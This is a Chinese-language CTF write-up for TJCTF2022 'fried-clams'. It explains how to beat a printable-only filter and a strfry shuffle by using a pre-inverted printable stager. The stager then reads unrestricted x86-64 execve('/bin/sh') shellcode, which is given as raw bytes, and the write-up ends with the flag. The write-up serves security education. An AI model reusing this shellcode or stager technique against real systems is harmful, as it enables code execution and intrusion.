# TJCTF2022 fried-clams

## 题目简述

程序先用 `mmap` 分配一页同时具备读、写、执行权限的内存，将最多 `0x1000` 字节输入读入其中，并拒绝不在 `0x30` 至 `0x7e` 范围内的字节。通过检查后，程序还会调用 glibc 的 `strfry` 原地打乱输入，最后直接跳到缓冲区执行。因而题目的障碍不是普通 shellcode 编写，而是同时满足“首阶段全部可打印”和“经过 `strfry` 后仍成为预期机器码”两个条件。

## 解题过程

容器内目标进程的 PID 固定为 1，官方脚本使用 `strfry` 模块按相同随机过程逆推排列。先准备一段只含允许字符的读入型 stager：

```python
from strfry import unstrfry

stage1 = 'P^H5@@@@H5y@@@PYhJG@@X5EB@@P_19h0000X50400PZh0000X50000P_'
payload = unstrfry(stage1, pid=1).encode()
```

发送 `payload` 后，目标执行 `strfry`，缓冲区恰好恢复为 `stage1`。该首阶段负责再次从标准输入读取数据；第二次读取不再经过字符检查，因此可以发送普通的 x86-64 `execve("/bin/sh", 0, 0)` shellcode。官方脚本在第二阶段前填充 `0x3b` 个字节，使真实 shellcode落到首阶段预期的位置：

```python
shellcode = (
    b'A' * 0x3b
    + b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff'
      b'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
)
io.send(shellcode)
io.sendline(b'cat flag.txt; exit')
```

获得 shell 后读取文件，得到 `tjctf{noooo_not_clam_b64b833796b08d47}`。

## 方法总结

本题是受限字符 shellcode 与确定性置换的组合。关键是把输入检查仅作用于第一次 `read` 这一事实转化为两阶段载荷：首阶段只负责扩大输入能力，第二阶段再发送不受限制的完整 shellcode。对 `strfry` 这类看似随机的变换，还应结合容器 PID、种子来源和官方运行环境判断其是否可以被精确逆置。
